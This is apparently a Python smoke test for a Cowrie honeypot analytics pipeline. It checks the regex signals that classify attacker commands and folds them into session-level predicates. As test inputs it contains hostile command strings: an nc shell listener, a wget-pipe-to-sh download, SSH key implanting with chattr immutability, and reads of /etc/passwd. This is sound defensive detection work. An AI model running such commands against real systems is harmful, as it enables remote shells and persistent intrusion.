"""Smoke test for the structural-predicate precompute/signature/fold path (item 30):
`enrich.sources.cowrie.predicates` (per-command sub-signals, the session-level fold,
the rescue evidence gate) and `lexical.pull_hash_to_predicates` /
`build_session_predicate_vectors` (the ES-shaped wiring, with a mocked ES) plus
`capture_anchor_snapshot.predicate_signature` (the anchor-side modal/frequency vector).

Also cross-validates the decomposed production fold against
`eval_predicate_falsification.compute_predicates` (the validated reference
implementation, item 29) over every labelled real session in the committed eval set —
the two must agree exactly, since the whole point of the decomposition is staying
numerically identical to the falsification script's session-level semantics.

No ES (the ES-shaped functions use an in-memory mock); no live network. Standalone —
no pytest.
"""
from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT / "scripts"))
sys.path.insert(0, str(ROOT / "src"))

from eval_jsonl import resolve as resolve_jsonl  # noqa: E402

from enrich.sources.cowrie.lexical import (
    build_session_predicate_vectors,
    pull_hash_to_predicates,
)
from enrich.sources.cowrie.predicates import (
    PREDICATE_NAMES,
    command_subsignals,
    fold_session_predicates,
    predicate_overlap,
)
from capture_anchor_snapshot import predicate_signature
from eval_predicate_falsification import compute_predicates, load_command_text

PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    if cond:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  ({detail})")


# ---------------------------------------------------------------------------
# command_subsignals — per-command regex sub-signals
# ---------------------------------------------------------------------------
check("uname -m -> has_uname_m",
      command_subsignals("uname -m")["has_uname_m"] is True)
check("plain uname (no -m) -> has_uname_m False",
      command_subsignals("uname -a")["has_uname_m"] is False)
check("arch token x86_64 captured",
      command_subsignals("file ./bot.x86_64")["arch_tokens"] == ["x86_64"])
check("two arch tokens in one command captured distinctly",
      set(command_subsignals("echo arm7 mips")["arch_tokens"]) == {"arm7", "mips"})
check("no arch token -> empty list",
      command_subsignals("ls -la")["arch_tokens"] == [])
check("case keyword detected", command_subsignals("case $ARCH in")["has_case_token"] is True)
check("c2 launch arg (path + ip:port)",
      command_subsignals("./bot 45.33.12.9 1338")["has_c2_launch"] is True)
check("no c2 launch arg", command_subsignals("cat /etc/passwd")["has_c2_launch"] is False)
check("self spread: nc listener",
      command_subsignals("nc -lvp 4444 -e /bin/sh")["has_self_spread"] is True)
check("self spread: telnet transport handoff",
      command_subsignals("wget http://x/y | sh -s telnet")["has_self_spread"] is True)
check("appliance verb: exact 'sh'", command_subsignals("sh")["is_appliance_verb"] is True)
check("appliance verb: exact 'enable'", command_subsignals("enable")["is_appliance_verb"] is True)
check("not an appliance verb", command_subsignals("sh -c ls")["is_appliance_verb"] is False)
check("host recon: whoami", command_subsignals("whoami")["has_host_recon"] is True)
check("host recon: /proc/cpuinfo",
      command_subsignals("cat /proc/cpuinfo")["has_host_recon"] is True)
check("no host recon", command_subsignals("rm -rf /tmp/x")["has_host_recon"] is False)
check("key write: authorized_keys",
      command_subsignals("echo ssh-rsa AAA >> ~/.ssh/authorized_keys")["has_key_write"] is True)
check("immutability: chattr +i",
      command_subsignals("chattr +i .ssh/authorized_keys")["has_immutability"] is True)
check("immutability: chattr -ia",
      command_subsignals("chattr -ia .ssh")["has_immutability"] is True)
check("multi-dir cd chain",
      command_subsignals("cd /tmp || cd /var/run || cd /dev/shm")["has_multi_dir_cd"] is True)
check("multi-tool fallback: wget||curl",
      command_subsignals("wget http://x/y || curl -O http://x/y")["has_multi_tool_fallback"]
      is True)
check("single tool, no fallback",
      command_subsignals("wget http://x/y")["has_multi_tool_fallback"] is False)
check("SUBSIGNAL keys stable", set(command_subsignals("ls").keys()) == {
    "has_uname_m", "arch_tokens", "has_case_token", "has_c2_launch", "has_self_spread",
    "is_appliance_verb", "has_host_recon", "has_key_write", "has_immutability",
    "has_multi_dir_cd", "has_multi_tool_fallback",
})


# ---------------------------------------------------------------------------
# fold_session_predicates — session-level recomposition
# ---------------------------------------------------------------------------
check("empty session folds to all-False",
      fold_session_predicates([]) == dict.fromkeys(PREDICATE_NAMES, False))

# multi_arch_targeting: uname -m alone is sufficient
sub_uname = [command_subsignals("uname -m")]
check("multi_arch_targeting: uname -m alone -> True",
      fold_session_predicates(sub_uname)["multi_arch_targeting"] is True)

# a single arch token with no case keyword and no uname -m -> False
sub_one_tok = [command_subsignals("file bot.arm7")]
check("multi_arch_targeting: single token, no case, no uname -> False",
      fold_session_predicates(sub_one_tok)["multi_arch_targeting"] is False)

# two distinct arch tokens pooled ACROSS two separate commands -> True
sub_two_commands = [command_subsignals("file bot.arm7"), command_subsignals("file bot.mips")]
check("multi_arch_targeting: 2 distinct tokens pooled across commands -> True",
      fold_session_predicates(sub_two_commands)["multi_arch_targeting"] is True)

# a case keyword in one command + one arch token in a DIFFERENT command -> True
sub_case_split = [command_subsignals("case $a in"), command_subsignals("echo arm7")]
check("multi_arch_targeting: case in one command + token in another -> True (pooled)",
      fold_session_predicates(sub_case_split)["multi_arch_targeting"] is True)

# key_write_immutability: authorized_keys in command A, chattr in command B -> True
sub_key_split = [
    command_subsignals("echo key >> ~/.ssh/authorized_keys"),
    command_subsignals("chattr +i .ssh"),
]
check("key_write_immutability: OR-pooled across 2 commands, then AND -> True",
      fold_session_predicates(sub_key_split)["key_write_immutability"] is True)
check("key_write_immutability: key write alone (no immutability anywhere) -> False",
      fold_session_predicates([command_subsignals("echo key >> ~/.ssh/authorized_keys")])
      ["key_write_immutability"] is False)

# hetero_target_fallback: multi-dir in command A, multi-tool in command B -> True
sub_hetero_split = [
    command_subsignals("cd /a || cd /b || cd /c"),
    command_subsignals("wget http://x || curl -O http://x"),
]
check("hetero_target_fallback: OR-pooled across 2 commands, then AND -> True",
      fold_session_predicates(sub_hetero_split)["hetero_target_fallback"] is True)
check("hetero_target_fallback: multi-dir alone -> False",
      fold_session_predicates([command_subsignals("cd /a || cd /b || cd /c")])
      ["hetero_target_fallback"] is False)

# appliance_menu_only: AND-fold over every command
sub_all_menu = [command_subsignals("sh"), command_subsignals("enable"), command_subsignals("system")]
check("appliance_menu_only: every command an appliance verb -> True",
      fold_session_predicates(sub_all_menu)["appliance_menu_only"] is True)
sub_one_non_menu = [command_subsignals("sh"), command_subsignals("cat /etc/passwd")]
check("appliance_menu_only: one non-verb command breaks the AND-fold -> False",
      fold_session_predicates(sub_one_non_menu)["appliance_menu_only"] is False)

# c2_launch_arg / self_spread / host_info_gather: plain OR across commands
sub_mixed = [command_subsignals("ls -la"), command_subsignals("./bot 45.33.12.9 1338")]
check("c2_launch_arg: fires from either command (OR-pooled)",
      fold_session_predicates(sub_mixed)["c2_launch_arg"] is True)

# a command hash absent from hash_to_predicates contributes nothing (fail-closed) —
# covered end-to-end below via build_session_predicate_vectors.


# ---------------------------------------------------------------------------
# predicate_overlap — the below-tau rescue evidence gate
# ---------------------------------------------------------------------------
fires = {"multi_arch_targeting": True, "c2_launch_arg": False, "self_spread": False,
         "appliance_menu_only": False, "host_info_gather": False,
         "key_write_immutability": False, "hetero_target_fallback": False}
all_false = dict.fromkeys(PREDICATE_NAMES, False)

check("overlap: session fires + anchor modal on same predicate -> True",
      predicate_overlap(fires, {"multi_arch_targeting": 0.75}) is True)
check("overlap: session fires but anchor below modal threshold -> False",
      predicate_overlap(fires, {"multi_arch_targeting": 0.4}) is False)
check("overlap: anchor exactly at modal threshold (0.5) -> True",
      predicate_overlap(fires, {"multi_arch_targeting": 0.5}) is True)
check("overlap: all-false session vector -> False even if anchor is fully modal",
      predicate_overlap(all_false, {"multi_arch_targeting": 1.0}) is False)
check("overlap: anchor signature all-zero -> False even if session fires",
      predicate_overlap(fires, dict.fromkeys(PREDICATE_NAMES, 0.0)) is False)
check("overlap: None session vector -> False", predicate_overlap(None, {"x": 1.0}) is False)
check("overlap: None anchor signature -> False", predicate_overlap(fires, None) is False)
check("overlap: session's firing predicate absent from a non-empty anchor signature "
      "-> treated as 0.0 -> False",
      predicate_overlap(fires, {"unrelated_predicate": 1.0}) is False)


# ---------------------------------------------------------------------------
# capture_anchor_snapshot.predicate_signature — anchor-side modal/frequency vector
# ---------------------------------------------------------------------------
check("predicate_signature: empty vectors -> all-zero",
      predicate_signature([]) == dict.fromkeys(PREDICATE_NAMES, 0.0))
vecs = [
    {**all_false, "key_write_immutability": True},
    {**all_false, "key_write_immutability": True},
    {**all_false, "key_write_immutability": False},
]
sig = predicate_signature(vecs)
check("predicate_signature: frequency is fires/n (2/3)",
      abs(sig["key_write_immutability"] - (2 / 3)) < 1e-9, str(sig))
check("predicate_signature: a never-fired predicate is 0.0",
      sig["c2_launch_arg"] == 0.0, str(sig))
check("predicate_signature: covers every PREDICATE_NAMES key",
      set(sig.keys()) == set(PREDICATE_NAMES))


# ---------------------------------------------------------------------------
# lexical wiring — pull_hash_to_predicates (mocked ES) + build_session_predicate_vectors
# ---------------------------------------------------------------------------
class MockES:
    """Serves one page of predicate-bearing command docs; enough to exercise the
    `_source`/filter/search_after shape `pull_hash_to_predicates` relies on."""

    def __init__(self, docs: dict[str, dict]):
        self._docs = docs

    def search(self, index, **body):
        del index
        hits = [
            {"_id": h, "_source": {"dshield": {"cowrie": {"enrichment": {"predicates": p}}}},
             "sort": [i]}
            for i, (h, p) in enumerate(self._docs.items())
        ]
        return {"hits": {"hits": hits if body.get("search_after") is None else []}}


h1_sub = command_subsignals("uname -m")
h2_sub = command_subsignals("echo key >> ~/.ssh/authorized_keys")
mock_es = MockES({"h1": h1_sub, "h2": h2_sub})
h2p = pull_hash_to_predicates(mock_es, "commands-idx")
check("pull_hash_to_predicates: returns a dict keyed by command hash",
      set(h2p.keys()) == {"h1", "h2"}, str(h2p))
check("pull_hash_to_predicates: sub-signal dict round-trips",
      h2p["h1"] == h1_sub, str(h2p["h1"]))

vectors = build_session_predicate_vectors([["h1"], ["h2"], ["h1", "h2"], ["missing"], []], h2p)
check("build_session_predicate_vectors: session with only uname -m -> multi_arch_targeting True",
      vectors[0]["multi_arch_targeting"] is True, str(vectors[0]))
check("build_session_predicate_vectors: session with only key-write (no immutability) -> False",
      vectors[1]["key_write_immutability"] is False, str(vectors[1]))
check("build_session_predicate_vectors: combining both hashes still no immutability -> False",
      vectors[2]["key_write_immutability"] is False, str(vectors[2]))
check("build_session_predicate_vectors: unresolvable hash -> fail-closed all-False",
      vectors[3] == dict.fromkeys(PREDICATE_NAMES, False), str(vectors[3]))
check("build_session_predicate_vectors: empty command_set -> all-False",
      vectors[4] == dict.fromkeys(PREDICATE_NAMES, False), str(vectors[4]))


# ---------------------------------------------------------------------------
# Cross-validation against the validated reference (eval_predicate_falsification.py,
# item 29) over every labelled real session in the committed eval set. This is the
# strongest available check that the per-command decomposition + fold stays
# numerically identical to the falsification script's session-level semantics.
# ---------------------------------------------------------------------------
labels_path = ROOT / "eval" / "labels.yaml"
sessions_path = resolve_jsonl(ROOT / "eval" / "sessions.unlabeled.jsonl.gz")
if labels_path.exists() and sessions_path.exists():
    evidence = load_command_text(labels_path, sessions_path)
    mismatches: list[str] = []
    checked = 0
    for sid, (_label, lines) in evidence.items():
        reference = compute_predicates(lines)
        produced = fold_session_predicates([command_subsignals(line) for line in lines])
        checked += 1
        if reference != produced:
            mismatches.append(f"{sid}: reference={reference} produced={produced}")
    check(f"production fold matches eval_predicate_falsification.compute_predicates "
          f"on all {checked} labelled real eval sessions",
          checked > 0 and not mismatches,
          "; ".join(mismatches[:5]) if mismatches else "no labelled sessions found")
else:
    print(f"  SKIP  production fold vs eval_predicate_falsification.compute_predicates "
          f"cross-validation ({labels_path} / {sessions_path} missing)")


print()
print(f"=== {len(PASSED)} passed, {len(FAILED)} failed ===")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
